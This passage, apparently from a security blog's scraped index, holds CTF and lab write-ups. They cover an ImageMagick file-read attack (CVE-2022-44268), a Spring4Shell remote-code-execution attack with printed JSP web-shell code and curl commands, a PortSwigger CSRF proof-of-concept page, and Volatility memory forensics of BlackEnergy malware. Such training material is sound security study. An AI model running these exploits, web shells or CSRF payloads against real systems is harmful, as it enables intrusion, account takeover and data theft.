打開API後需要用什麼Decode\nExploit # 通靈登入介面 sqlmap直接打，有打出time based的部分，就卡住了 另外一組的jin也是卡在這邊 Q7 # 題目敘述 # 透過情報收集，發現此網頁有上傳檔案服務的一個頁面，是一個免費的開源跨平台軟件套件，發現此版本可能有漏洞可利用。 此測試機存在一個上傳圖片的服務，且它存在著某個漏洞，讓你有機會可以進行攻擊，拿到內部存在的資料\n[連線IP/連結資訊] 192.168.100.83\n[備註] 答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}\nHint # [提示一] 網頁服務使用了什麼圖片編輯工具?檢視原始碼有重要訊息!\n[提示二] 網頁弱點為ImageMagick 任意文件讀取\n[提示三] 請上傳圖片得到必要訊息\n[提示四] 下載上傳後的圖片分析內容\nExploit # 先掃port: nmap-\u0026gt;8080 確認目前的開源工具為ImageMagick 搜尋一下ImageMagick的Vulnerability-\u0026gt;CVE-2022-44268 用現成工具 $ sudo apt-get install pngcrush exiftool exiv2 -y $ pngcrush -text a \u0026#34;profile\u0026#34; \u0026#34;/etc/hosts\u0026#34; abc.png $ exiv2 -pS pngout.png 上傳到系統，如果該檔案存在就會回傳一張圖片到前端供我們下載，之後就可以用exiftool分析\n$ exiftool return.png ... Raw Profile Type : .. 13.6539323739343234366663300a. ... $ python -c \u0026#34;print(bytes.fromhex(\u0026#39;6539323739343234366663300a\u0026#39;).decode(\u0026#39;utf-8\u0026#39;))\u0026#34; e92794246fc0 目前不知道具體flag的位置和檔案名稱\n賽後和asef以及ccccc有聊到這一題，發現居然是在前端的code有一串base64被hidden，裡面其實就是flag檔案的絕對位置，幹\u0026hellip;真的通好久啊\nQ8 # 題目敘述 # 你透過情報收集，聽聞某集團子公司有項服務上線使用的測試主機(192.168.100.88)因資訊人員便宜行事竟放在公開網路上。 此測試機(Spring Framework)的某項專案裡存在一個Web表單服務(/greeting)，它存在著某個漏洞，讓你有機會可以進行攻擊，你需要先找到正確的服務端口與頁面，並藉由這個程式的漏洞取得遠端主機的控制權限，進而取得公司內部資料(flag.txt)。\n[連線IP/連結資訊] 192.168.100.88\n[備註] 答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}\nHint # [提示一] 使用Nmap與目錄掃描工具(http://192.168.100.88:???/???/greeting)\n[提示二] AccessLogValve\n[提示三] 也許有公開的POC使用?\n[提示四] Webshell + URL Encode\n[提示五] 找不到資料?使用linux指令find / -type f –name 來找看看吧\nExploit # 先用nmap掃Port -\u0026gt; 8888 dirsearch看sub folder -\u0026gt; hello $ dirsearch -u \u0026#34;http://192.168.100.88:8888\u0026#34; ... 400 795B http://192.168.100.88:8888/\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd 400 795B http://192.168.100.88:8888/a%5c.aspx 302 0B http://192.168.100.88:8888/hello -\u0026gt; REDIRECTS TO: /hello/ ... 得知路徑為http://192.168.100.88:8888/hello/greeting 根據AccessLogValve得知漏洞應該為CVE-2022-22965 直接使用現成工具達到RCE $ python exploit-core.py --url \u0026#34;http://192.168.100.88:8888/hello/greeting\u0026#34; --file shell [*] Resetting Log Variables. [*] Response code: 200 [*] Modifying Log Configurations [*] Response code: 200 [*] Response Code: 200 [*] Resetting Log Variables. [*] Response code: 200 [+] Exploit completed [+] Check your target for a shell [+] File: shell.jsp [+] Shell should be at: http://192.168.100.88:8888/shell.jsp?cmd=id $ curl http://192.168.100.88:8888/shell.jsp\\?cmd\\=find%20/%20-iname%20flag.txt --output - /usr/local/share/man/flag.txt $ curl http://192.168.100.88:8888/shell.jsp\\?cmd\\=cat%20/usr/local/share/man/flag.txt --output - CSC{FLAG_can_we_cut_to_the_chase?} // - java.io.InputStream in = -.getRuntime().exec(request.getParameter(\u0026#34;cmd\u0026#34;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } - 記得要注意URL encode Flag: CSC{FLAG_can_we_cut_to_the_chase?}1 "},{"id":70,"href":"/security/practice/portswigger-web-security-academy/csrf/csrf---apprentice/","title":"CSRF - APPRENTICE","section":"Securities","content":" CSRF - APPRENTICE # tags: Portswigger Web Security Academy Web # [TOC]\nLab: CSRF vulnerability with no defenses # Description: This lab\u0026rsquo;s email change functionality is vulnerable to CSRF. Goal: To solve the lab, craft some HTML that uses a CSRF attack to change the viewer\u0026rsquo;s email address and upload it to your exploit server. You can log in to your own account using the following credentials: wiener:peter Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim. Background # :::spoiler CSRF 攻擊原理 [Day25]- 新手的Web系列CSRF\n使用者登入網站 使用者透過身份驗證在本機形成cookie 使用者點擊含有惡意程式的連結，或是直接連結了第三方網站，並瀏覽了帶有以下html程式碼的網頁：\u0026lt;img src=http://www.***.com/transfer.php?id=5\u0026amp;money=22\u0026gt; 惡意程式碼利用使用者的身份發請求，即執行CSRF 使用者的帳號少錢錢勒QQ # 常見的CSRF方法\nHTML標籤\n\u0026lt;img\u0026gt;標籤屬性 \u0026lt;img src=\u0026#34;惡意連結\u0026#34;\u0026gt; 以GET方式請求第三方網站，瀏覽器會帶上使用者的cookie發出GET請求\n\u0026lt;script\u0026gt;標籤屬性 `\u0026lt;script src=\u0026#34;惡意連結\u0026#34;\u0026gt;` \u0026lt;iframe\u0026gt;標籤屬性 `\u0026lt;iframe src=\u0026#34;惡意連結\u0026#34;\u0026gt;` :::\nRecon # According to the description It said the email change function has some CSRF exploitation. So, maybe I can login by username and password they provided. Find where has CSRF Then I tried to change my email and trace the package Then we can forge a website and let our victim to access In this lab, PortSwigger provided an exploited server that can simulate a victim to access.\nExp # Directly create CSRF PoC by Burp Suit Exploit Payload:\n\u0026lt;html\u0026gt; \u0026lt;!-- CSRF PoC - generated by Burp Suite Professional --\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt;history.pushState(\u0026#39;\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;/\u0026#39;)\u0026lt;/script\u0026gt; \u0026lt;form action=\u0026#34;https://0a050071049c31f4815898e900330005.web-security-academy.net/my-account/change-email\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;danger\u0026amp;#64;gmail\u0026amp;#46;com\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :::spoiler Success Screenshot :::\nReference # Burp Suite Security Academy Writeup 从0到1完全掌握 CSRF Lab: CSRF vulnerability with no defenses - write up\n"},{"id":71,"href":"/security/practice/cyberdefender/endpoint-forensic/cyberdefender---blackenergy/","title":"CyberDefender - BlackEnergy","section":"Securities","content":" CyberDefender - BlackEnergy # :::spoiler TOC [TOC] ::: Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/99\nScenario # A multinational corporation has been hit by a cyber attack that has led to the theft of sensitive data. The attack was carried out using a variant of the BlackEnergy v2 malware that has never been seen before. The company\u0026rsquo;s security team has acquired a memory dump of the infected machine, and they want you, as a soc analyst, to analyze the dump to understand the attack scope and impact.\n==Q1== # Which volatility profile would be best for this machine?\nExploit # 就是起手式:\n$ ./volatility_2.6_win64_standalone.exe -f CYBERDEF-567078-20230213-171333.raw imageinfo Volatility Foundation Volatility Framework 2.6 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (D:\\NTU\\CTF\\CyberDefenders\\BlackEnergy\\CYBERDEF-567078-20230213-171333.raw) PAE type : No PAE DTB : 0x39000L KDBG : 0x8054cde0L Number of Processors : 1 Image Type (Service Pack) : 3 KPCR for CPU 0 : 0xffdff000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2023-02-13 18:29:11 UTC+0000 Image local date and time : 2023-02-13 10:29:11 -0800 :::spoiler Flag Flag: WinXPSP2x86 :::\n==Q2== # How many processes were running when the image was acquired?\nExploit # 直覺是pslist，然後扣掉exit的那些process，就是答案\n$ ./volatility_2.6_win64_standalone.exe -f CYBERDEF-567078-20230213-171333.raw pslist Volatility Foundation Volatility Framework 2.6 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0x89c037f8 System 4 0 55 245 ------ 0 0x89965020 smss.exe 368 4 3 19 ------ 0 2023-02-14 04:54:15 UTC+0000 0x89a98da0 csrss.exe 592 368 11 321 0 0 2023-02-14 04:54:15 UTC+0000 0x89a88da0 winlogon.exe 616 368 18 508 0 0 2023-02-14 04:54:15 UTC+0000 0x89938998 services.exe 660 616 15 240 0 0 2023-02-14 04:54:15 UTC+0000 0x89aa0020 lsass.exe 672 616 21 335 0 0 2023-02-14 04:54:15 UTC+0000 0x89aaa3d8 VBoxService.exe 832 660 9 115 0 0 2023-02-14 04:54:15 UTC+0000 0x89aab590 svchost.exe 880 660 21 295 0 0 2023-02-13 17:54:16 UTC+0000 0x89a9f6f8 svchost.exe 968 660 10 244 0 0 2023-02-13 17:54:17 UTC+0000 0x89730da0 svchost.exe 1060 660 51 1072 0 0 2023-02-13 17:54:17 UTC+0000 0x897289a8 svchost.exe 1108 660 5 78 0 0 2023-02-13 17:54:17 UTC+0000 0x899adda0 svchost.exe 1156 660 13 192 0 0 2023-02-13 17:54:17 UTC+0000 0x89733938 explorer.exe 1484 1440 14 489 0 0 2023-02-13 17:54:18 UTC+0000 0x897075d0 spoolsv.exe 1608 660 10 106 0 0 2023-02-13 17:54:18 UTC+0000 0x89694388 wscntfy.exe 480 1060 1 28 0 0 2023-02-13 17:54:30 UTC+0000 0x8969d2a0 alg.exe 540 660 5 102 0 0 2023-02-13 17:54:30 UTC+0000 0x89982da0 VBoxTray.exe 376 1484 13 125 0 0 2023-02-13 17:54:30 UTC+0000 0x8994a020 msmsgs.exe 636 1484 2 157 0 0 2023-02-13 17:54:30 UTC+0000 0x89a0b2f0 taskmgr.exe 1880 1484 0 -------- 0 0 2023-02-13 18:25:15 UTC+0000 2023-02-13 18:26:21 UTC+0000 0x899dd740 rootkit.exe 964 1484 0 -------- 0 0 2023-02-13 18:25:26 UTC+0000 2023-02-13 18:25:26 UTC+0000 0x89a18da0 cmd.exe 1960 964 0 -------- 0 0 2023-02-13 18:25:26 UTC+0000 2023-02-13 18:25:26 UTC+0000 0x896c5020 notepad.exe 528 1484 0 -------- 0 0 2023-02-13 18:26:55 UTC+0000 2023-02-13 18:27:46 UTC+0000 0x89a0d180 notepad.exe 1432 1484 0 -------- 0 0 2023-02-13 18:28:25 UTC+0000 2023-02-13 18:28:40 UTC+0000 0x899e6da0 notepad.exe 1444 1484 0 -------- 0 0 2023-02-13 18:28:42 UTC+0000 2023-02-13 18:28:47 UTC+0000 0x89a0fda0 DumpIt.exe 276 1484 1 25 0 0 2023-02-13 18:29:08 UTC+0000 :::spoiler Flag Flag: 19 :::\n==Q3== # What is the process ID of cmd.exe?\nExploit # 呈上題\n:::spoiler Flag Flag: 1960 :::\n==Q4== # What is the name of the most suspicious process?\nExploit # 呈第3題，感覺這個process應該就是提權的工具\n:::spoiler Flag Flag: rootkit.exe :::\n==Q5== # Which process shows the highest likelihood of code injection?\nExploit # 直覺會看malfind，然後找相關的process :::spoiler malfind result\n$ ./volatility_2.6_win64_standalone.exe -f CYBERDEF-567078-20230213-171333.raw malfind Volatility Foundation Volatility Framework 2.6 Process: csrss.exe Pid: 592 Address: 0x7f6f0000 Vad Tag: Vad Protection: PAGE_EXECUTE_READWRITE Flags: Protection: 6 0x7f6f0000 c8 00 00 00 84 01 00 00 ff ee ff ee 08 70 00 00 .............p.. 0x7f6f0010 08 00 00 00 00 fe 00 00 00 00 10 00 00 20 00 00 ................ 0x7f6f0020 00 02 00 00 00 20 00 00 8d 01 00 00 ff ef fd 7f ................ 0x7f6f0030 03 00 08 06 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x7f6f0000 c8000000 ENTER 0x0, 0x0 0x7f6f0004 8401 TEST [ECX], AL 0x7f6f0006 0000 ADD [EAX], AL 0x7f6f0008 ff DB 0xff 0x7f6f0009 ee OUT DX, AL 0x7f6f000a ff DB 0xff 0x7f6f000b ee OUT DX, AL 0x7f6f000c 087000 OR [EAX+0x0], DH 0x7f6f000f 0008 ADD [EAX], CL 0x7f6f0011 0000 ADD [EAX], AL 0x7f6f0013 0000 ADD [EAX], AL 0x7f6f0015 fe00 INC BYTE [EAX] 0x7f6f0017 0000 ADD [EAX], AL 0x7f6f0019 0010 ADD [EAX], DL 0x7f6f001b 0000 ADD [EAX], AL 0x7f6f001d 2000 AND [EAX], AL 0x7f6f001f 0000 ADD [EAX], AL 0x7f6f0021 0200 ADD AL, [EAX] 0x7f6f0023 0000 ADD [EAX], AL 0x7f6f0025 2000 AND [EAX], AL 0x7f6f0027 008d010000ff ADD [EBP-0xffffff], CL 0x7f6f002d ef OUT DX, EAX 0x7f6f002e fd STD 0x7f6f002f 7f03 JG 0x7f6f0034 0x7f6f0031 0008 ADD [EAX], CL 0x7f6f0033 06 PUSH ES 0x7f6f0034 0000 ADD [EAX], AL 0x7f6f0036 0000 ADD [EAX], AL 0x7f6f0038 0000 ADD [EAX], AL 0x7f6f003a 0000 ADD [EAX], AL 0x7f6f003c 0000 ADD [EAX], AL 0x7f6f003e 0000 ADD [EAX], AL Process: winlogon.exe Pid: 616 Address: 0x4a5e0000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 4, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x4a5e0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x4a5e0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x4a5e0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x4a5e0030 00 00 00 00 25 00 25 00 01 00 00 00 00 00 00 00 ....%.%......... 0x4a5e0000 0000 ADD [EAX], AL 0x4a5e0002 0000 ADD [EAX], AL 0x4a5e0004 0000 ADD [EAX], AL 0x4a5e0006 0000 ADD [EAX], AL 0x4a5e0008 0000 ADD [EAX], AL 0x4a5e000a 0000 ADD [EAX], AL 0x4a5e000c 0000 ADD [EAX], AL 0x4a5e000e 0000 ADD [EAX], AL 0x4a5e0010 0000 ADD [EAX], AL 0x4a5e0012 0000 ADD [EAX], AL 0x4a5e0014 0000 ADD [EAX], AL 0x4a5e0016 0000 ADD [EAX], AL 0x4a5e0018 0000 ADD [EAX], AL 0x4a5e001a 0000 ADD [EAX], AL 0x4a5e001c 0000 ADD [EAX], AL 0x4a5e001e 0000 ADD [EAX], AL 0x4a5e0020 0000 ADD [EAX], AL 0x4a5e0022 0000 ADD [EAX], AL 0x4a5e0024 0000 ADD [EAX], AL 0x4a5e0026 0000 ADD [EAX], AL 0x4a5e0028 0000 ADD [EAX], AL 0x4a5e002a 0000 ADD [EAX], AL 0x4a5e002c 0000 ADD [EAX], AL 0x4a5e002e 0000 ADD [EAX], AL 0x4a5e0030 0000 ADD [EAX], AL 0x4a5e0032 0000 ADD [EAX], AL 0x4a5e0034 2500250001 AND EAX, 0x1002500 0x4a5e0039 0000 ADD [EAX], AL 0x4a5e003b 0000 ADD [EAX], AL 0x4a5e003d 0000 ADD [EAX], AL 0x4a5e003f 00 DB 0x0 Process: winlogon.exe Pid: 616 Address: 0x2afc0000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 4, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x2afc0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x2afc0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x2afc0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x2afc0030 00 00 00 00 23 00 23 00 01 00 00 00 00 00 00 00 ....#.#......... 0x2afc0000 0000 ADD [EAX], AL 0x2afc0002 0000 ADD [EAX], AL 0x2afc0004 0000 ADD [EAX], AL 0x2afc0006 0000 ADD [EAX], AL 0x2afc0008 0000 ADD [EAX], AL 0x2afc000a 0000 ADD [EAX], AL 0x2afc000c 0000 ADD [EAX], AL 0x2afc000e 0000 ADD [EAX], AL 0x2afc0010 0000 ADD [EAX], AL 0x2afc0012 0000 ADD [EAX], AL 0x2afc0014 0000 ADD [EAX], AL 0x2afc0016 0000 ADD [EAX], AL 0x2afc0018 0000 ADD [EAX], AL 0x2afc001a 0000 ADD [EAX], AL 0x2afc001c 0000 ADD [EAX], AL 0x2afc001e 0000 ADD [EAX], AL 0x2afc0020 0000 ADD [EAX], AL 0x2afc0022 0000 ADD [EAX], AL 0x2afc0024 0000 ADD [EAX], AL 0x2afc0026 0000 ADD [EAX], AL 0x2afc0028 0000 ADD [EAX], AL 0x2afc002a 0000 ADD [EAX], AL 0x2afc002c 0000 ADD [EAX], AL 0x2afc002e 0000 ADD [EAX], AL 0x2afc0030 0000 ADD [EAX], AL 0x2afc0032 0000 ADD [EAX], AL 0x2afc0034 2300 AND EAX, [EAX] 0x2afc0036 2300 AND EAX, [EAX] 0x2afc0038 0100 ADD [EAX], EAX 0x2afc003a 0000 ADD [EAX], AL 0x2afc003c 0000 ADD [EAX], AL 0x2afc003e 0000 ADD [EAX], AL Process: winlogon.exe Pid: 616 Address: 0xe880000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 4, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x0e880000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0e880010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0e880020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x0e880030 00 00 00 00 25 00 25 00 01 00 00 00 00 00 00 00 ....%.%......... 0x0e880000 0000 ADD [EAX], AL 0x0e880002 0000 ADD [EAX], AL 0x0e880004 0000 ADD [EAX], AL 0x0e880006 0000 ADD [EAX], AL 0x0e880008 0000 ADD [EAX], AL 0x0e88000a 0000 ADD [EAX], AL 0x0e88000c 0000 ADD [EAX], AL 0x0e88000e 0000 ADD [EAX], AL 0x0e880010 0000 ADD [EAX], AL 0x0e880012 0000 ADD [EAX], AL 0x0e880014 0000 ADD [EAX], AL 0x0e880016 0000 ADD [EAX], AL 0x0e880018 0000 ADD [EAX], AL 0x0e88001a 0000 ADD [EAX], AL 0x0e88001c 0000 ADD [EAX], AL 0x0e88001e 0000 ADD [EAX], AL 0x0e880020 0000 ADD [EAX], AL 0x0e880022 0000 ADD [EAX], AL 0x0e880024 0000 ADD [EAX], AL 0x0e880026 0000 ADD [EAX], AL 0x0e880028 0000 ADD [EAX], AL 0x0e88002a 0000 ADD [EAX], AL 0x0e88002c 0000 ADD [EAX], AL 0x0e88002e 0000 ADD [EAX], AL 0x0e880030 0000 ADD [EAX], AL 0x0e880032 0000 ADD [EAX], AL 0x0e880034 2500250001 AND EAX, 0x1002500 0x0e880039 0000 ADD [EAX], AL 0x0e88003b 0000 ADD [EAX], AL 0x0e88003d 0000 ADD [EAX], AL 0x0e88003f 00 DB 0x0 Process: winlogon.exe Pid: 616 Address: 0x16be0000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 4, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x16be0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x16be0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x16be0020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x16be0030 00 00 00 00 28 00 28 00 01 00 00 00 00 00 00 00 ....(.(......... 0x16be0000 0000 ADD [EAX], AL 0x16be0002 0000 ADD [EAX], AL 0x16be0004 0000 ADD [EAX], AL 0x16be0006 0000 ADD [EAX], AL 0x16be0008 0000 ADD [EAX], AL 0x16be000a 0000 ADD [EAX], AL 0x16be000c 0000 ADD [EAX], AL 0x16be000e 0000 ADD [EAX], AL 0x16be0010 0000 ADD [EAX], AL 0x16be0012 0000 ADD [EAX], AL 0x16be0014 0000 ADD [EAX], AL 0x16be0016 0000 ADD [EAX], AL 0x16be0018 0000 ADD [EAX], AL 0x16be001a 0000 ADD [EAX], AL 0x16be001c 0000 ADD [EAX], AL 0x16be001e 0000 ADD [EAX], AL 0x16be0020 0000 ADD [EAX], AL 0x16be0022 0000 ADD [EAX], AL 0x16be0024 0000 ADD [EAX], AL 0x16be0026 0000 ADD [EAX], AL 0x16be0028 0000 ADD [EAX], AL 0x16be002a 0000 ADD [EAX], AL 0x16be002c 0000 ADD [EAX], AL 0x16be002e 0000 ADD [EAX], AL 0x16be0030 0000 ADD [EAX], AL 0x16be0032 0000 ADD [EAX], AL 0x16be0034 2800 SUB [EAX], AL 0x16be0036 2800 SUB [EAX], AL 0x16be0038 0100 ADD [EAX], EAX 0x16be003a 0000 ADD [EAX], AL 0x16be003c 0000 ADD [EAX], AL 0x16be003e 0000 ADD [EAX], AL Process: winlogon.exe Pid: 616 Address: 0x2b010000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 4, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x2b010000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x2b010010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x2b010020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x2b010030 00 00 00 00 2c 00 2c 00 01 00 00 00 00 00 00 00 ....,.,......... 0x2b010000 0000 ADD [EAX], AL 0x2b010002 0000 ADD [EAX], AL 0x2b010004 0000 ADD [EAX], AL 0x2b010006 0000 ADD [EAX], AL 0x2b010008 0000 ADD [EAX], AL 0x2b01000a 0000 ADD [EAX], AL 0x2b01000c 0000 ADD [EAX], AL 0x2b01000e 0000 ADD [EAX], AL 0x2b010010 0000 ADD [EAX], AL 0x2b010012 0000 ADD [EAX], AL 0x2b010014 0000 ADD [EAX], AL 0x2b010016 0000 ADD [EAX], AL 0x2b010018 0000 ADD [EAX], AL 0x2b01001a 0000 ADD [EAX], AL 0x2b01001c 0000 ADD [EAX], AL 0x2b01001e 0000 ADD [EAX], AL 0x2b010020 0000 ADD [EAX], AL 0x2b010022 0000 ADD [EAX], AL 0x2b010024 0000 ADD [EAX], AL 0x2b010026 0000 ADD [EAX], AL 0x2b010028 0000 ADD [EAX], AL 0x2b01002a 0000 ADD [EAX], AL 0x2b01002c 0000 ADD [EAX], AL 0x2b01002e 0000 ADD [EAX], AL 0x2b010030 0000 ADD [EAX], AL 0x2b010032 0000 ADD [EAX], AL 0x2b010034 2c00 SUB AL, 0x0 0x2b010036 2c00 SUB AL, 0x0 0x2b010038 0100 ADD [EAX], EAX 0x2b01003a 0000 ADD [EAX], AL 0x2b01003c 0000 ADD [EAX], AL 0x2b01003e 0000 ADD [EAX], AL Process: winlogon.exe Pid: 616 Address: 0x3ad10000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 4, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x3ad10000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x3ad10010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x3ad10020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x3ad10030 00 00 00 00 25 00 25 00 01 00 00 00 00 00 00 00 ....%.%......... 0x3ad10000 0000 ADD [EAX], AL 0x3ad10002 0000 ADD [EAX], AL 0x3ad10004 0000 ADD [EAX], AL 0x3ad10006 0000 ADD [EAX], AL 0x3ad10008 0000 ADD [EAX], AL 0x3ad1000a 0000 ADD [EAX], AL 0x3ad1000c 0000 ADD [EAX], AL 0x3ad1000e 0000 ADD [EAX], AL 0x3ad10010 0000 ADD [EAX], AL 0x3ad10012 0000 ADD [EAX], AL 0x3ad10014 0000 ADD [EAX], AL 0x3ad10016 0000 ADD [EAX], AL 0x3ad10018 0000 ADD [EAX], AL 0x3ad1001a 0000 ADD [EAX], AL 0x3ad1001c 0000 ADD [EAX], AL 0x3ad1001e 0000 ADD [EAX], AL 0x3ad10020 0000 ADD [EAX], AL 0x3ad10022 0000 ADD [EAX], AL 0x3ad10024 0000 ADD [EAX], AL 0x3ad10026 0000 ADD [EAX], AL 0x3ad10028 0000 ADD [EAX], AL 0x3ad1002a 0000 ADD [EAX], AL 0x3ad1002c 0000 ADD [EAX], AL 0x3ad1002e 0000 ADD [EAX], AL 0x3ad10030 0000 ADD [EAX], AL 0x3ad10032 0000 ADD [EAX], AL 0x3ad10034 2500250001 AND EAX, 0x1002500 0x3ad10039 0000 ADD [EAX], AL 0x3ad1003b 0000 ADD [EAX], AL 0x3ad1003d 0000 ADD [EAX], AL 0x3ad1003f 00 DB 0x0 Process: winlogon.exe Pid: 616 Address: 0x3f750000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 4, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x3f750000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x3f750010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x3f750020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x3f750030 00 00 00 00 27 00 27 00 01 00 00 00 00 00 00 00 ....\u0026#39;.\u0026#39;......... 0x3f750000 0000 ADD [EAX], AL 0x3f750002 0000 ADD [EAX], AL 0x3f750004 0000 ADD [EAX], AL 0x3f750006 0000 ADD [EAX], AL 0x3f750008 0000 ADD [EAX], AL 0x3f75000a 0000 ADD [EAX], AL 0x3f75000c 0000 ADD [EAX], AL 0x3f75000e 0000 ADD [EAX], AL 0x3f750010 0000 ADD [EAX], AL 0x3f750012 0000 ADD [EAX], AL 0x3f750014 0000 ADD [EAX], AL 0x3f750016 0000 ADD [EAX], AL 0x3f750018 0000 ADD [EAX], AL 0x3f75001a 0000 ADD [EAX], AL 0x3f75001c 0000 ADD [EAX], AL 0x3f75001e 0000 ADD [EAX], AL 0x3f750020 0000 ADD [EAX], AL 0x3f750022 0000 ADD [EAX], AL 0x3f750024 0000 ADD [EAX], AL 0x3f750026 0000 ADD [EAX], AL 0x3f750028 0000 ADD [EAX], AL 0x3f75002a 0000 ADD [EAX], AL 0x3f75002c 0000 ADD [EAX], AL 0x3f75002e 0000 ADD [EAX], AL 0x3f750030 0000 ADD [EAX], AL 0x3f750032 0000 ADD [EAX], AL 0x3f750034 27 DAA 0x3f750035 0027 ADD [EDI], AH 0x3f750037 0001 ADD [ECX], AL 0x3f750039 0000 ADD [EAX], AL 0x3f75003b 0000 ADD [EAX], AL 0x3f75003d 0000 ADD [EAX], AL 0x3f75003f 00 DB 0x0 Process: winlogon.exe Pid: 616 Address: 0x5d080000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 4, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x5d080000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x5d080010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x5d080020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x5d080030 00 00 00 00 28 00 28 00 01 00 00 00 00 00 00 00 ....(.(......... 0x5d080000 0000 ADD [EAX], AL 0x5d080002 0000 ADD [EAX], AL 0x5d080004 0000 ADD [EAX], AL 0x5d080006 0000 ADD [EAX], AL 0x5d080008 0000 ADD [EAX], AL 0x5d08000a 0000 ADD [EAX], AL 0x5d08000c 0000 ADD [EAX], AL 0x5d08000e 0000 ADD [EAX], AL 0x5d080010 0000 ADD [EAX], AL 0x5d080012 0000 ADD [EAX], AL 0x5d080014 0000 ADD [EAX], AL 0x5d080016 0000 ADD [EAX], AL 0x5d080018 0000 ADD [EAX], AL 0x5d08001a 0000 ADD [EAX], AL 0x5d08001c 0000 ADD [EAX], AL 0x5d08001e 0000 ADD [EAX], AL 0x5d080020 0000 ADD [EAX], AL 0x5d080022 0000 ADD [EAX], AL 0x5d080024 0000 ADD [EAX], AL 0x5d080026 0000 ADD [EAX], AL 0x5d080028 0000 ADD [EAX], AL 0x5d08002a 0000 ADD [EAX], AL 0x5d08002c 0000 ADD [EAX], AL 0x5d08002e 0000 ADD [EAX], AL 0x5d080030 0000 ADD [EAX], AL 0x5d080032 0000 ADD [EAX], AL 0x5d080034 2800 SUB [EAX], AL 0x5d080036 2800 SUB [EAX], AL 0x5d080038 0100 ADD [EAX], EAX 0x5d08003a 0000 ADD [EAX], AL 0x5d08003c 0000 ADD [EAX], AL 0x5d08003e 0000 ADD [EAX], AL Process: winlogon.exe Pid: 616 Address: 0x62220000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 4, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x62220000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x62220010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x62220020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x62220030 00 00 00 00 2a 00 2a 00 01 00 00 00 00 00 00 00 ....*.*......... 0x62220000 0000 ADD [EAX], AL 0x62220002 0000 ADD [EAX], AL 0x62220004 0000 ADD [EAX], AL 0x62220006 0000 ADD [EAX], AL 0x62220008 0000 ADD [EAX], AL 